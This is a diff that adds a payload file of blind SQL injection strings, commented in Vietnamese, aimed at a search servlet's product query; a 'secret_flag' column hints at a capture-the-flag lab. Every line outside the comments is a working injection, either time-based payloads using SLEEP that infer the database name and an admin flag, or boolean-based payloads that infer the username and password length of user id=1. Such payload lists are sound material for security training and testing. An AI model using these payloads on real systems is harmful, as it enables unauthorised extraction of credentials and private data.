@@ -1,0 +1,44 @@
+# ==========================================================
+# SQL Injection Payloads: Blind SQL Injection
+# Target: SearchServlet -> ProductDAO.searchProducts()
+# Kỹ thuật: Boolean-based Blind & Time-based Blind
+# ==========================================================
+
+# ----------------------------------------------------------
+# A. TIME-BASED BLIND SQL INJECTION
+# Lợi dụng hàm SLEEP(seconds) hoặc BENCHMARK() để suy luận thông tin
+# qua thời gian phản hồi (Latency) của HTTP Request.
+# ----------------------------------------------------------
+
+# 1. Kiểm tra xác nhận lỗ hổng Time-based
+' AND IF(1=1, SLEEP(3), 0) -- 
+' AND IF(1=2, SLEEP(3), 0) -- 
+
+# 2. Đoán độ dài tên database
+' AND IF(LENGTH(database())=8, SLEEP(3), 0) -- 
+
+# 3. Đoán từng ký tự của database name
+# Ví dụ ký tự thứ nhất = 's' (ASCII 115)
+' AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) -- 
+
+# 4. Đoán ký tự đầu tiên của flag tài khoản admin
+' AND IF(ASCII(SUBSTRING((SELECT secret_flag FROM users WHERE id=1),1,1))=70, SLEEP(3), 0) -- (70 = 'F')
+
+# ----------------------------------------------------------
+# B. BOOLEAN-BASED BLIND SQL INJECTION
+# Lợi dụng việc kết quả trang hiển thị danh sách (TRUE) hoặc trống rỗng (FALSE)
+# ----------------------------------------------------------
+
+# 1. Kiểm tra điều kiện TRUE (trang hiển thị danh sách sản phẩm)
+' AND 1=1 -- 
+
+# 2. Kiểm tra điều kiện FALSE (trang không có kết quả nào)
+' AND 1=2 -- 
+
+# 3. Suy luận ký tự đầu tiên của username id=1 là 'a'
+' AND (SELECT SUBSTRING(username, 1, 1) FROM users WHERE id=1) = 'a' -- 
+' AND (SELECT SUBSTRING(username, 1, 1) FROM users WHERE id=1) = 'b' -- 
+
+# 4. Tìm độ dài của mật khẩu admin
+' AND (SELECT LENGTH(password) FROM users WHERE id=1) > 10 -- 
+' AND (SELECT LENGTH(password) FROM users WHERE id=1) = 28 -- 
